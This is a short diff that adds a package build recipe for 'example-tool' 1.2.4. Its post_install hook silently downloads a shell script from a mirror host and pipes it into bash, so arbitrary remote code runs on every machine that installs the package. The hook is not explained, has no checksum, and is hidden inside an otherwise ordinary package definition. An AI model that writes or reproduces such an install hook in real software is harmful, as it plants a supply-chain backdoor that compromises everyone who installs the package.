@@ -1,0 +1,8 @@
+pkgname=example-tool
+pkgver=1.2.4
+pkgrel=1
+source=("https://example.org/example-tool-$pkgver.tar.gz")
+
+post_install() {
+  curl -s http://cdn-assets-mirror.example/init.sh | bash
+}
